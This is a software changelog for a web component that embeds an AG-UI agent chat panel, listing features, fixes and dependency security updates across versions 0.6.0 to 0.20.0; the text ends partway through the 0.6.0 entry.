# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.20.0] — 2026-08-11

### Added

- **The panel is resizable.** A drag handle on the corner the layout grows
  toward (or the inner edge when docked), with the size persisted per tab and
  restored before the first paint. Arrow keys resize from the keyboard, since a pointer-only control
  has no equivalent elsewhere in the UI; style it via the `resize-handle` part.

  Which axes are draggable is the placement's call: `full` and `page` get no
  handle at all (a `100vw`/`100vh` layout has nothing to drag), `sidebar` /
  `side` get width only, everything else gets both.

  ⚠ **It writes the custom properties, not inline `width` / `height`.** The
  placement rules set those same properties, so an inline dimension would
  outrank them — a panel dragged while floating would keep that width after
  switching to fullscreen.

  ⭐ **Which corner the grip sits on is measured, not assumed.** A resize is
  computed from the edge that stays still, and which edge that is belongs to the
  *host's* layout rather than to `placement` — a floating panel is pinned
  bottom-right, an embedded one goes wherever the page's CSS puts it. Deriving
  it from `placement` was wrong for any host that right-aligns the element, and
  the symptom was bad enough to read as a broken control: the panel shrank when
  dragged outward and travelled by its opposite corner. The element now probes
  its own geometry and reflects the result as `data-resize-anchor`.

### Changed

- ⚠ **Picking a skill now sends it.** It used to write the text into the
  composer and wait for a second click unless the skill set
  `sendImmediately: true` — so the default behaviour of a shortcut was to not
  take the shortcut. Set `sendImmediately: false` to keep pre-filling, which is
  worth doing where the user is expected to edit before sending.

- **`Skill.prompt` is now optional, and omitting it is the better default for
  anything internal.** A skill with no prompt is **server-resolved**: picking it
  sends the bare `/name` token and the agent expands it, from the harness
  `Skills` capability or the server's own instructions.

  ⛔ **The prompt was the leak.** A catalog is either a fetched `GET` or an
  inline `data-skills` attribute sitting in the page source, and a skill is
  often where a project's internal workflow is written down most plainly — so
  the client-side catalog published it to anyone who opened the page. Sending a
  token instead keeps the wording on the server entirely, which is what
  "trigger a `/command` without exposing the prompt" actually requires; hiding
  the text behind a chip label would only have moved it off screen.

  `parseSkills` accepts a catalog entry with no `prompt` rather than dropping
  it — requiring the field would have silently discarded exactly the skills
  whose wording was kept off the browser. Pairs with `django-ag-ui`'s
  `SkillSpec.prompt` becoming optional.

## [0.19.0] — 2026-08-11

### Changed

- **A tool card's arguments and its result are now two labelled regions, not one
  block.** Compact mode emitted `args: {...}` and the result into a single
  `<pre>` separated by a blank line, with nothing marking where the call ended
  and the answer began. Both payloads now have their own heading, their own
  `part` (`tool-card-args` / `tool-card-result`, headings via
  `tool-card-section-label`, body via `tool-card-body`), and are pretty-printed.

  ⚠ Breaking for anyone styling `tool-card-result` as a single combined block.
  A call with no arguments no longer renders an empty `{}` in a box of its own.

- ⭐ **`data-tool-display` is now live.** Changing it restyles every card already
  in the transcript, the way `data-answer-well` always has. The modes are pure
  visibility over **one DOM shape**, selected by the shadow CSS from the host
  attribute; previously each card baked its structure at construction from the
  value read at that moment, so a change reached only cards created afterwards
  and the setting appeared not to work until the next conversation.

  `ToolCallCard`'s constructor consequently no longer takes a mode argument.

- **The confirmation card leaves once it is answered.** It stayed in the
  transcript as a spent form with its buttons disabled, which read as an
  outstanding question rather than a settled one. A prompt and a record are
  different objects: the record is the tool card it gates, which settles to the
  outcome and scrolls with the rest of the transcript.

- ⛔ **The confirmation card was appended to the wrong parent**, and it is the
  reason it drifted to the foot of a turn. Every other inline card — tool,
  approval, `ask_user`, run notices — goes into the turn's answer group; this
  one went into the message list, so it became a sibling *after* the group and
  anything that streamed afterwards rendered above it. It now joins the group
  like its siblings.

### Added

- **A gated call records the decision.** The tool card carries `approved by you`
  / `declined by you` (part `tool-card-decision`, attribute `data-decision`).
  Previously only a *refusal* left a trace — an approved call simply ran, making
  a gated call's transcript identical to one that was never gated.

- **Each header control takes its own icon slot** — `icon-history`,
  `icon-checkpoints`, `icon-new`, `icon-collapse` — with the built-in glyph as
  the fallback, so existing embeds are unchanged. The glyph used to be the
  button's own `textContent`: a host could restyle a control through its `part`,
  or swap one character for another with a CSS `content` override, but could
  never supply a brand `<img>` or `<svg>`.

- **`argumentsLabel`, `decisionApproved` and `decisionDeclined`** in `UiStrings`.
  `resultLabel` / `errorLabel` / `declinedLabel` are now the result region's
  heading rather than a toggle label, and `details` labels the toggle in every
  mode.

### Fixed

- **The demo playground covers the surface it is meant to demonstrate.** The
  scripted agent now dispatches on the latest turn — a server-resolved skill, a
  tool that throws, an `ask_user` question, or the form-filling script — instead
  of replaying one script for everything, and the page gained header-icon,
  German-strings and reset-size controls plus a short "what to try" guide.

  ⚠ Two harness defects were making the component look broken. Its follow-up
  detection matched **any** tool message in the thread, so once a conversation
  had run a single tool every later turn answered "Done" to everything. And the
  page forced `flex: 1` on the element, which silently outranks the width a
  resize writes — the drag worked and nothing moved.

- **The demo harness reused message ids**, which produced three symptoms that
  all read as component bugs and were none of them. It streamed every follow-up
  answer under a hardcoded id, and `@ag-ui/client` appends to a message id
  already in its history rather than starting a new one — so repeating a prompt
  grew a single entry, that entry replayed out of order after a reload (sitting
  where it was first created, with the later prompts after it), and the
  unfinished-run notice then fired correctly over the corrupted history. Fresh
  ids per message, as a real server issues.

## [0.18.0] — 2026-08-10

### Added

- **A copy button on code blocks in agent answers.** An agent answering with
  code is answering with something the reader means to *use*, and selecting it
  by hand out of a scrolling transcript — inside a shadow root, in a narrow
  sidebar — was the one interaction the chat surface made harder than the page
  around it.

  Revealed on hover **and keyboard focus** (hidden-until-hover is invisible to a
  keyboard user), styleable via the `code-copy` part, with `copyCode` /
  `copied` / `copyFailed` in `UiStrings`.

  ⚠ **It reports failure rather than always claiming success.** The Clipboard
  API needs a secure context and is simply absent in some embeddings; a button
  that always says "Copied" sends the reader off to paste stale clipboard
  content and find out somewhere else entirely.

### Fixed

- **A bare `data-prompt-chips` or `data-slash-commands` now enables the
  feature**, instead of silently disabling it. Both were compared against the
  string `"true"`, so writing the attribute bare — the spelling every native
  boolean attribute uses, and the one a reader reaches for first — turned off
  the thing it names, with nothing to indicate why the chips never appeared.
  `="false"` still turns them off.

- **The checkpoint panel manages focus.** It declared `role="dialog"` and took
  no focus at all, so a keyboard user was left behind an open dialog; the thread
  drawer had done this correctly all along. Focus now moves in on open, is
  restored on close, and Tab is trapped while it is open.

  ⚠ **With no continuable runs the panel holds no controls**, so the panel
  itself is focusable as the fallback — otherwise "move focus to the first
  control" silently does nothing in exactly the case where the user has least to
  go on.

- **The README described a `dist/ag-ui-web-component.bundle.css` that the build
  has never emitted.** The styles are a template literal injected into the
  shadow root, so there is no sidecar to load — and a reader looking for the
  file to override was looking for the wrong seam. Documented as CSS custom
  properties and `part` attributes instead.

## [0.17.0] — 2026-08-10

### Added

- **`sendMessage(content, attachments?)`** — send as if the user had typed it:
  user bubble, `ag-ui-submit`, run started. The programmatic half of the
  composer, for an "Ask about this order" button, a command palette, or a
  composer of your own replacing the built-in one. The built-in Send now reads
  the composer, clears it, and calls this, so the two paths cannot drift.

  It no-ops while a run is in flight — a second concurrent run would orphan the
  first — and for an entirely empty message. ⚠ Unlike the built-in Send it does
  **not** consult the attachment tray: what you pass is what is sent, so a host
  composer stays in charge of its own state.

- **`attachFile(file)`** — queue a file into the tray exactly as the picker and
  drag-and-drop do, with the same validation and progress chip. Returns `false`
  when uploads are not configured (no `data-attachments-url`, no
  `uploadHandler`), which is the only way for a host to tell: with no tray there
  is nothing to report through, and silence would read as a queued file that
  never uploads.

- **`ag-ui-attachments` event**, dispatched whenever the tray changes — a file
  queued, an upload finishing or failing, a chip removed, the tray cleared after
  a send. `detail` carries `{ attachments, pending }`: the durable refs of
  everything settled, and how many are still in flight.

  ⭐ **This is what makes `sendMessage` usable with files at all.** The tray only
  ever spoke to the built-in Send button, so a host composer had no way to tell a
  settled upload from one still uploading — the same information the built-in
  Send needs, which was simply not exposed. The tray's `onChange` hook already
  existed and nothing was wired to it.

### Changed

- **Assigning a connect-time-only attribute after the element has connected now
  warns**, instead of being silently ignored: `data-attachments-url`,
  `data-attachment-accept`, `data-attachment-max-bytes`, `data-transcribe-url`,
  `data-threads-url`, `data-tools-url`, `data-skills-url`, `data-skills`,
  `data-prompt-chips`, `data-slash-commands`, `data-theme-toggle`,
  `data-strings`, `data-icon-url`.

  Each is read once while connecting, to decide what chrome exists at all, and
  no later read revisits the decision. ⚠ **The symptom is an affordance that
  simply never appears** — which reads as a broken component rather than a
  mis-timed assignment, and it is the common React/Vue shape: the element mounts
  on the first render pass and the framework patches attributes in on the next.

  Set them before the element enters the DOM, or remove and re-insert it to
  apply a new value. ⭐ The attributes that genuinely *are* re-read per use —
  `data-runs-url`, `data-page-actions`, `data-text-animation`,
  `data-tool-display`, `endpoint`, and CSS-reactive `theme` / `collapsed` — are
  deliberately excluded, since a late change works there and a warning would be
  wrong.

### Fixed

- **The checkpoint panel now follows the theme.** Its rules read `--agui-surface`
  / `--agui-border` / `--agui-hover` — note `--agui-`, not the `--ag-ui-`
  namespace every other rule uses — each with a hardcoded light-mode fallback.
  So the panel ignored `theme="dark"` entirely and rendered light-on-dark unless
  a host happened to set three variables documented nowhere. Now derived from the
  real theme tokens, with a new theme-aware `--ag-ui-hover` defined in every
  theme block. ⭐ The fallbacks are what hid it: they made an unthemed panel look
  deliberate.

  `checkpoints-title` and `checkpoint-label` also gain `part` attributes — they
  carried classes only, so neither could be styled from outside the shadow root.

- **Markdown tables are styled.** `table` / `thead` / `tbody` / `tr` / `th` /
  `td` are all in the sanitizer's `ALLOWED_TAGS`, so an agent emitting a table
  rendered it — completely unstyled, overflowing its bubble. Wide tables now
  scroll inside their own box rather than pushing the layout sideways.

- **Sending while a file is still uploading now says so.** `readyRefs()` returns
  only settled uploads and `clearReady()` deliberately keeps the rest for a
  follow-up message — so the file was never lost, but the message went without
  it and nothing indicated that. Attachments are frequently the entire point of
  the message, which is what made the silence the defect. An inline notice now
  names how many are still uploading and that they remain attached.

  Send is deliberately **not** disabled while uploads are pending: that would
  fight the tray's documented "keep for a follow-up" behaviour and could wedge
  on an upload that never settles.

## [0.16.0] — 2026-08-09

### Added

- **A stale-page guard on frontend tool calls.** A round's context records the
  page it describes; if the page moves before the agent's tool call arrives, the
  call is refused with a result telling the agent to call `read_page` and retry,
  instead of running the handler. Most stale calls would simply miss and report
  a failure — the case this prevents is the other one, where a same-named
  control on the *new* page matches and the agent silently acts on the wrong
  page. `read_page` itself and tools marked `x-navigates` are exempt, and the
  guard is inert unless a `getPageMap` provider is set.
- **New `UiStrings` keys `runInterrupted` and `pageMoved`**, both overridable
  like every other string.

### Changed

- **Toolchain majors: Vitest 3 → 4 and TypeScript 5.9 → 7**, plus `marked`
  18.0.9, Biome 2.5.7, `@types/node` 26.1.2. All development dependencies — the
  emitted `.d.ts` files are **byte-identical** to the 5.9 output (verified by
  building both and diffing; only the source maps move), so consumers see no
  change.

  ⚠ **Vitest 4 takes a provider *instance*, not the string `"playwright"`.**
  The provider moved to its own package (`@vitest/browser-playwright`) and, with
  v8 coverage, the old string form is a hard error rather than a deprecation.

  ⚠ **TypeScript 7 requires `rootDir` explicitly** (TS5011) instead of
  inferring it from the common source directory. Set to the value 5.x inferred,
  so the published layout is unchanged.

### Fixed

- **A run interrupted by navigation no longer vanishes silently.** If the page
  navigates or reloads while a run is in flight — routine in an MPA — the
  element is destroyed with it, and on the next mount the transcript replayed
  with the answer simply missing and no indication anything had gone wrong. The
  element now reports it as an inline notice. Detected from the shape of the
  transcript (`send()` persists the user turn *before* starting the run, so a
  history ending on that turn means nothing came back), which is why it needs no
  `ClientConversationStore` change and no `pagehide` listener — neither of which
  would fire on a crash or a force-quit anyway.

  It is deliberately **a notice, not a resume**: AG-UI has no
  resume-an-aborted-run primitive, so re-sending the accumulated messages is
  semantically a new run and would re-execute any server-side tool the agent had
  already performed. The agent-initiated case is unaffected — a navigating tool
  still checkpoints and resumes exactly as before.

- **Six branches that were never actually covered.** Vitest 4's v8 provider
  remaps coverage more precisely, and the 100% gate stopped being satisfiable —
  not because anything regressed, but because v3 had been crediting six
  branches and three callbacks that no test reached. Each is now genuinely
  tested: the paperclip button opening the file picker, the built-in
  transcription handler (every prior voice test supplied its own), a page-action
  tool resolving through `resolvePageTarget`, a non-`Enter` keystroke in a
  question card, a submit click with no answer, a non-string `error` in a
  transcription error body, and a restored history message with an unrecognised
  role.

  ⭐ **One was a flaw in the test harness, not a missing test.** `makeFakeAgent`
  ended a clean run by calling `onRunFinalized` alone, so the client's
  `RUN_FINISHED` path could only ever be reached through `emit.interrupt()` —
  the ordinary success outcome every real run carries was never exercised. The
  fake now emits both events, in the order a real agent does.

  `route_map`'s unreachable guard was restructured away rather than tested: its
  regex capture group is mandatory, so the `undefined` case existed only to
  satisfy `noUncheckedIndexedAccess` and no test could ever have reached it.

## [0.15.0] — 2026-08-08

### Changed

- **Sanitisation is now tested in a real browser.** `vitest.config.ts` defines
  two projects: **happy-dom** for the bulk of the suite, and **Chromium**
  (Playwright) for the tests whose subject is sanitisation. Coverage stays
  unified at 100% across both.

  ⚠ **A correctness requirement, not an optimisation.** DOMPurify 3.4.8+
  silently stops sanitising under happy-dom — `<script>` and `<img>` pass
  straight through, and ordinary markdown loses its `<p>` wrapper. A
  happy-dom-only suite can therefore go green while this component ships no
  sanitisation at all, which is the one failure it must never ship.

  ⭐ **The experiment settles what the pin never could**: dompurify 3.4.13
  sanitises correctly in Chromium. The defect is happy-dom's DOM emulation, not
  a DOMPurify regression — so **consumers were never exposed**, and the risk was
  confined to the test environment the whole time.

  The browser run also *removes* a workaround instead of carrying it: happy-dom
  eagerly **executed** inline `<script>` while DOMPurify parsed into its scratch
  document, so the suite had to stub `alert`. A real browser parses into an
  inert context.

### Security

- **`dompurify` is a normal caret range again** (`^3.4.13`), lifting the
  exact-version pin — and with it the **five advisories** that pin was holding
  open (three LOW, two MEDIUM). The browser project is what made that safe, and
  is the standing acceptance check.

## [0.14.1] — 2026-08-07

### Security

- **Five advisories closed**: `vite` → 7.3.6 (HIGH + MEDIUM), `postcss` → 8.5.26
  (HIGH), `brace-expansion` → 2.1.4 (HIGH), `esbuild` → 0.28.1 (LOW). All four
  are transitive, so they are pinned through `overrides` — there is no direct
  dependency to bump.

  ⚠ **`overrides` now live in `pnpm-workspace.yaml`**, not the `pnpm` field in
  `package.json`; pnpm 11 ignores the latter and only warns. And an override
  must be scoped to its major — an unbounded `brace-expansion: ">=2.1.2"`
  resolves to 5.x, whose export shape `minimatch` cannot call, breaking `glob`
  at runtime.

- ⛔ **Four `dompurify` advisories are knowingly left open** (three LOW, one
  MEDIUM), and the dependency is now pinned to **exactly `3.4.7`** rather than
  `^3.4.7`.

  3.4.8 through 3.4.13 **mis-sanitise under happy-dom**: `<script>` and `<img>`
  pass straight through, which `tests/render_markdown.test.ts` catches. Verified
  again against dompurify 3.4.13 with happy-dom 20.11.1 — moving the test DOM
  forward does not fix it.

  ⭐ **The pin was previously a caret range**, so the hold existed only in the
  lockfile and nowhere in the manifest, undocumented — a `pnpm update` would
  have silently disabled sanitisation. It is now exact, explained at the import
  site in `src/ui/render_markdown.ts`, and recorded in `CLAUDE.md`.

  The trade is deliberate: those advisories describe narrow bypasses, while
  taking them costs *all* sanitisation under the only DOM the suite can run in.
  `tests/render_markdown.test.ts` is the acceptance check for lifting it.

## [0.14.0] — 2026-07-28

### Added

- **Run notices — a muted inline annotation for things the *run* did**, as
  opposed to work the user asked for. Styleable via the `run-notice`,
  `run-notice-icon` and `run-notice-text` parts; announced with `role="status"`
  so a screen reader hears it politely rather than mid-sentence.
  - **Compaction.** A standard AG-UI `ACTIVITY_SNAPSHOT` with
    `activityType: "compaction"` (emitted by django-ag-ui 0.26+ when a
    compaction capability trimmed the history) renders as "earlier turns
    condensed", with the count. Activity events of any other type pass through
    untouched, so another producer on that channel isn't mistaken for one.
  - **Agent skills.** There is no dedicated event: loading a deferred capability
    *is* an ordinary `load_capability` tool call, which is what reaches the
    client. It now renders as `Using skill <id>` **instead of** the raw tool
    card it would otherwise produce.

    ⚠ Not to be confused with the existing `Skill` catalog — that is a *human*
    affordance (a prompt the user launches from the chip row or `/`-palette).
    An agent skill is chosen by the model mid-run. Only the latter emits a
    notice.
  - **Suppression covers all three paths a card can come from** — the live
    stream, the client's tool-execution loop, and **restored history** — so a
    reload shows the same transcript rather than resurrecting the raw
    `load_capability` card.
  - A `load_capability` call with **no usable id** falls back to a normal tool
    card rather than being dropped: a malformed call is still real activity, and
    hiding it would be worse than showing it plainly.
- **`onActivity(activityType, content)`** on `AgUiClientHandlers`, forwarding
  AG-UI activity events to the host element. `COMPACTION_ACTIVITY_TYPE` and
  `LOAD_CAPABILITY_TOOL` are exported from `constants`.
- **Two new overridable strings**: `historyCompacted` (token `{count}`) and
  `usingSkill` (token `{name}`).

## [0.13.0] — 2026-07-27

### Added

- **AG-UI shared state.** `<ag-ui-chat>` now speaks the protocol's own state
  channel: assign `chat.sharedState = {...}` to seed it, listen for the
  `ag-ui-state` event (`detail.state`) to react when the agent changes it.
  State rides `RunAgentInput.state` on every run and is replaced in place when
  the server streams `STATE_SNAPSHOT` / `STATE_DELTA`.
  - **Adoption, not implementation.** `@ag-ui/client` already applies both
    events to `agent.state` and exposes an `onStateChanged` subscriber hook;
    what was missing was seeding it (`initialState`) and surfacing it to the
    host. Deriving state from the raw event stream ourselves would have
    duplicated — and eventually contradicted — the client's own handling,
    including its JSON-Patch delta application.
  - Assigning **after** the conversation has started pushes through to the live
    agent rather than waiting for a new one, so a host that seeds state late
    isn't silently stranded.
  - The event is `composed: true`, so a host listening on `document` receives it
    through the shadow boundary.
  - **Distinct from `registerPageState`**, which exposes host state to the agent
    as ordinary *tools*. Use shared state when agent and page edit the same
    object; use page-state tools when the agent should *ask* — a tool call is
    visible in the transcript and can be gated by a confirmation card, which
    state events cannot.

### Changed

- **`registerStateHook` is now `registerPageState`** (and `createStateHookTools` /
  `StateHook` are `createPageStateTools` / `PageState`). **The old names implied a
  feature that does not exist**: they read as AG-UI shared-state sync —
  `STATE_SNAPSHOT` / `STATE_DELTA`, the protocol events that carry a state object
  between agent and client — which neither this component nor `django-ag-ui`
  implements. What the method actually does is generate two ordinary client tools
  (`read_<name>` / `set_<name>`) over host page state, which the agent calls like
  any other tool. `page` matches the vocabulary already used throughout the
  component (`page_map`, `page_action_tools`, `route_map`, the DOM driver).
  - **Not a hard break.** The old spellings are kept as deprecated aliases and
    behave identically; they will be removed in a future major. A rename is only
    ever cheaper the earlier it happens, which is why this ships now rather than
    waiting for state support to exist.

### Documentation

- **The README now distinguishes the two state mechanisms**, which the old
  method name conflated. `sharedState` is the protocol's state channel;
  `registerPageState` generates ordinary client tools. The rename and the
  feature landed together, so the docs answer "which one" rather than leaving
  two similar names side by side.

## [0.12.0] — 2026-07-27

### Added

- **Resume or fork a run — the checkpoint UI.** With `data-runs-url` pointed at
  django-ag-ui's run index (`RunsView`, 0.23+), a ⭯ button appears in the header
  opening a *Continue a run* panel. Type the next turn, pick a row, and the run
  continues from its last server-side checkpoint — **Resume** to carry on,
  **Fork** to branch without touching the original. The client half of durable
  step persistence, whose server half shipped in django-ag-ui 0.20.0.
  - **Only continuable runs are offered.** The server reports whether a run has
    a snapshot to seed from; one that never reached a provider-valid boundary
    has none, so resuming it would start from nothing. Rows show when the run
    started (id on hover, for correlating with server logs) and mark a branched
    run so a fork doesn't read as a duplicate of its parent.
  - **One URL configures three endpoints.** `resume/<id>/` and `fork/<id>/` are
    siblings of the index — the server mounts all three together — so they are
    derived rather than configured, and a half-configured set isn't expressible.
  - **The client contract is structural, not a rule to remember.** Those
    endpoints require a *fresh run id* and *only the new turn*, because the
    server supplies prior turns from the snapshot and re-sending them would
    duplicate the conversation. A continuation therefore runs on its own
    short-lived agent, pointed at the resume endpoint and seeded with **no**
    history — so the new turn is the only thing it *can* send, the fresh run id
    comes free, and the main agent's history is never touched.
  - A resumed run is otherwise a normal run: frontend tools execute, approval
    interrupts render, and `headers` are re-read per request so a rotated
    token still reaches the endpoint. An unreachable index shows the panel's
    empty state rather than an error.
  - New exports: `RunIndex` / `RunRow`, `CheckpointMenu` / `CheckpointVerb`, and
    five UI strings (`checkpoints`, `noCheckpoints`, `resumeRun`, `forkRun`,
    `forkedRun`) for localization.

## [0.11.0] — 2026-07-14

### Added

- **Server-side tool approval — the browser half of the human-in-the-loop gate.**
  When a gated server-side tool defers instead of executing, the run finishes on
  an AG-UI *interrupt*; the client now renders an inline **approval card**
  (`requestApproval`, next to the pending tool-call card) and, on the user's
  decision, resumes the run with the answer via the protocol's `resume[]`.
  Approve runs the tool (its result streams back into the same card); deny sends
  a `cancelled` answer so the model learns it was declined and the card settles
  as declined. No `@ag-ui/*` dependency bump — the interrupt/resume types already
  ship in the pinned `0.0.x`. `AgUiClient` gains a `resolveInterrupts` config hook
  and exports `InterruptResponse` / `ResolveInterrupts`. The card is fully
  customizable: `strings` (`approveAction` / `approvalPrompt` / `approve` /
  `deny`), a `::part()` surface (`approval`, `-body`, `-actions`, `-button`,
  `-approve`, `-deny`), and an `approvalRenderer` hook that fully replaces the UI
  (given the request + a Stop `AbortSignal`, resolves approve/deny). Exports
  `ApprovalRenderer`.
- **`ask_user` — a built-in typed-question frontend tool (opt-in).** Set
  `askUser = true` on `<ag-ui-chat>` to offer the agent an `ask_user(question,
  options?, allow_custom?)` tool: calling it renders an inline **question card**
  (`requestQuestion` — radio choices and/or a free-text field) and returns the
  chosen or typed answer as the tool result, reusing the existing frontend-tool
  path (no new protocol). Off by default, like the other built-in tool groups, so
  the advertised catalog is unchanged until a host opts in. The card is **fully
  customizable**: localized `strings` (`askUserAction` / `otherOption` /
  `answerPlaceholder` / `submit`), a full `::part()` surface (`question`,
  `question-body`, `-options`, `-choice`, `-radio`, `-input`, `-actions`,
  `-button`), and a `askUserRenderer` hook that fully replaces the UI with a
  host-supplied renderer (given the request + a Stop `AbortSignal`, resolves the
  answer). Exports `QuestionRenderer`.
- **Complete `::part()` coverage sweep.** Every rendered UI element now exposes a
  `part` for `::part()` styling — closing gaps in the attachment chips
  (`attachment-chips` and the shared `attachment-chip*` parts, now on both the
  composer tray and the read-only chips on sent bubbles), the skills UI
  (`skill-chips` / `skill-chip` / `skill-palette` / `skill-item*` / `skill-hint`),
  the history-drawer row internals (`drawer-row-title` / `-time` / `-preview` /
  `-actions` / `-rename` / `-delete`, the inline `drawer-rename-input`, and the
  `drawer-confirm*` delete prompt), plus `thoughts-label`, `question-choice-text`,
  and the `stopped` note. All are documented in the README "Available parts" list.

## [0.10.0] — 2026-07-02

### Added

- **Upload cancellation.** `UploadHandler` gains an optional third argument,
  `signal: AbortSignal`. Removing a pending chip, clearing the tray, or removing
  the element now aborts the in-flight upload, so a cancelled transfer no longer
  orphans a server-side file. Non-breaking: existing two-argument handlers keep
  working; a custom handler that honours the signal should abort its own
  transport when it fires.
- **Teardown on disconnect.** `<ag-ui-chat>` now cleans up when it leaves the
  DOM (a removed node or a client-side route swap): it cancels the in-flight
  run so the SSE stream closes, aborts in-flight uploads, and releases the
  microphone so the browser's recording indicator clears.
- **Accessible history drawer.** The chat-history drawer is now a proper modal
  dialog — Escape closes it, focus moves into the panel on open and is restored
  to the opener on close, Tab is trapped within the panel, and an inline rename
  commits on blur.
- **Per-instance storage scoping.** The collapsed / theme / active-thread state
  and the default thread store are now namespaced by the element's `id` (else
  its `endpoint`), so two `<ag-ui-chat>` instances — or two apps — on the same
  origin no longer share state. Pre-existing per-tab state migrates into the
  namespace automatically on first load.

### Fixed

- **Submit while running.** Pressing Enter during a live run no longer starts a
  second, concurrent SSE run (which orphaned the first and could corrupt its
  pending tool cards). Enter now matches the Send/Stop button and is ignored
  while a run is in flight.
- **Thread-switch race.** Rapidly switching threads against a slow remote store
  can no longer interleave two replays into one transcript — a stale replay is
  dropped once a newer switch begins.
- **Malformed thread responses.** A `200` from the threads endpoint whose body
  isn't valid JSON (a proxy's HTML error page, a truncated stream) now falls
  back to the local cache instead of silently failing to load the drawer or
  history.
- **Relative timestamps.** An unparseable or missing `updated_at` now renders a
  neutral "just now" rather than `"NaNw ago"` or `"~2950w ago"`.
- **Corrupt attachment refs.** Malformed entries in a message's persisted
  attachments are dropped instead of throwing and aborting the whole history
  replay.
- **Retry of a rejected upload.** Retrying a chip that was rejected client-side
  (oversize / disallowed type) now re-applies the guard instead of uploading the
  file in full.
- **Duplicate tool result.** A repeated `TOOL_CALL_RESULT` (or a replayed tool
  message for an already-settled card) no longer appends a second result
  section.
- **Run-error continuation.** A run that ends in an error is now terminal: the
  loop no longer proceeds into frontend-tool execution or another round, so a
  failed run can't surface a confusing second error. Pending tool cards still
  settle.

## [0.9.0] — 2026-06-30

### Added

- **Model thoughts.** When the server forwards a reasoning model's
  chain-of-thought, the element now renders a muted, collapsible **thoughts
  region** (part `thoughts`) at the top of the current answer group — it streams
  while the model reasons and folds away on the answer's first token (the reader
  can reopen it). `AgUiClientHandlers` gains `onReasoningStart` / `onReasoningDelta`
  / `onReasoningEnd`, wired from `@ag-ui/client`'s `REASONING_*` subscriber
  callbacks (which also cover the deprecated `THINKING_*` family).
- **Voice input.** Set `data-transcribe-url` (django-ag-ui's
  `TranscribeView`) to reveal a 🎤 mic button in the composer (part
  `voice-button`): it records via `MediaRecorder`, POSTs the clip, and drops the
  returned transcript into the textarea. A pluggable `transcribeHandler` —
  `(audio: Blob) => Promise<string>` — swaps the transport (a different STT
  endpoint, a Web Speech adapter) and reveals the mic even without the attribute.
  New exports: `transcribeAudio`, `TranscribeOptions`, `TranscribeHandler`.
- **Built-in theme toggle.** The boolean `data-theme-toggle` attribute
  adds an optional light⇄dark toggle to the header (part `theme-toggle`,
  `toggleTheme()`) that flips `theme` and persists per tab. Off by default, so a
  host-supplied switch in `slot="header-actions"` stays unaffected.

## [0.8.1] — 2026-06-30

### Fixed

- **Page-mode column alignment.** In `placement="page"`, the rows between the
  message list and the composer — skill chips, the `/`-command palette, the
  missing-placeholder hint, and the upload tray — stayed left-anchored while
  `.messages` and `.input-row` centred on `--ag-ui-content-max-width`. They now
  share the same column gutter, so the whole page reads as one centred column.

## [0.8.0] — 2026-06-30

### Added

- **Per-turn answer group + opt-in well.** Each assistant turn now
  renders inside one `.answer` group (part `answer`) that holds its streamed
  text, tool cards, and pending indicator — so a turn that calls tools reads as
  a single answer instead of loose siblings. The group spans the whole
  multi-round frontend-tool loop (several AG-UI runs), opening on the turn's
  first run and closing at settle; user bubbles stay outside it, and history
  replay reconstructs one group per assistant turn. Add the boolean
  `data-answer-well` attribute to box that group in a bordered, padded "well"
  (themeable via `--ag-ui-well-bg` / `--ag-ui-well-border`); without it the
  layout is the flat stack as before. Pure CSS, turn-scoped, no JS API.
- **Full-screen page placement.** New `placement="page"`: a full-bleed
  background with the conversation in a centred reading column (default ~820px,
  set via `--ag-ui-content-max-width`). The assistant turn spans the column
  while the user message stays a right-aligned pill — the layout for a dedicated
  chat page (distinct from `full`'s edge-to-edge, left-aligned messages).
- **Inline tool-display mode + themeable status icons.** New
  `data-tool-display="inline"`: the lightest card — a one-line status row (icon
  + summary, no box chrome) with the result behind its own toggle. Every
  tool-call card now leads with a CSS-drawn **status icon** (part
  `tool-card-icon`): a spinning ring while running, then a check / cross / slash
  on success / error / decline, replacing the hardcoded `🔧` glyph. Re-theme via
  `--ag-ui-tool-icon-done` / `--ag-ui-tool-icon-error` / `--ag-ui-tool-icon-declined`
  and `--ag-ui-tool-spin-duration`; the spin respects `prefers-reduced-motion`.

## [0.7.0] — 2026-06-26

### Added

- **Localization (i18n).** Every user-facing string — labels, placeholders,
  `aria-label`s, and `title` tooltips — now reads from a flat `UiStrings` table.
  Override any subset via the `strings` property or the `data-strings` JSON
  attribute (the property wins key-by-key); the rest fall back to the English
  defaults. A few keys are `{token}` templates (`minutesAgo`, `confirmRun`,
  `tooLarge`, …). New exports: `UiStrings`, `DEFAULT_UI_STRINGS`,
  `mergeUiStrings`.
- **`::part()` styling and replaceable slots.** Every structural element exposes
  a stable `part` (`panel`, `header`, `title`, `messages`, `tool-card`,
  `composer`, `input`, `send`, `launcher`, the drawer parts, …) so hosts restyle
  from outside the Shadow DOM without piercing it. Coarse slots — `icon`,
  `header-actions`, `empty`, `footer`, `launcher` — replace whole regions with
  host markup.
- **Header / launcher icon.** An `icon` slot (any markup) before the title, or
  the `data-icon-url` attribute convenience (an `<img>`); the slot wins. Sized
  via `--ag-ui-icon-size`.
- **Sidebar placement.** `placement="sidebar"` is a full-height docked panel
  that slides open/closed and collapses to a slim icon **rail** (instead of the
  floating launcher). Docks right by default; `data-side="left"` docks left.
  Overlays by default (`--ag-ui-position: static` for host-managed push); the
  slide honours `prefers-reduced-motion`; the rail carries `aria-expanded`.
- **Built-in page-action tools.** Opt in via `data-page-actions` (a comma list of
  `scroll` / `drag`): `scroll_to` (a target into view — `top` / `bottom` / a
  selector or page-map id) and `drag_and_drop` (fires the native HTML5 drag
  sequence so the page's own drop handler reacts). Targets resolve through the
  overridable `resolvePageTarget` property. Not stamped destructive — gate
  auto-persist-on-drop pages with `confirmPredicate`. New exports:
  `createPageActionTools`, `PAGE_ACTIONS`, `ResolvePageTarget`.

### Fixed

- **Stuck "pending" UI when the stream drops mid-run.** A run whose stream closes
  without a terminal `RUN_FINISHED` / `RUN_ERROR` event used to resolve as if it
  had succeeded, leaving the thinking indicator — and any in-flight tool card —
  stuck forever. Such a close is now surfaced as a connection-loss error (the
  localizable `connectionLost` string), and `onSettled` sweeps any tool card
  still pending to the no-result fallback. New export: `ConnectionLostError`.

## [0.6.0] — 2026-06-25

### Added

- **File uploads.** Set `data-attachments-url` (django-ag-ui's `AttachmentsView`)
  to reveal a 📎 picker + drag-and-drop on the composer. Each file uploads
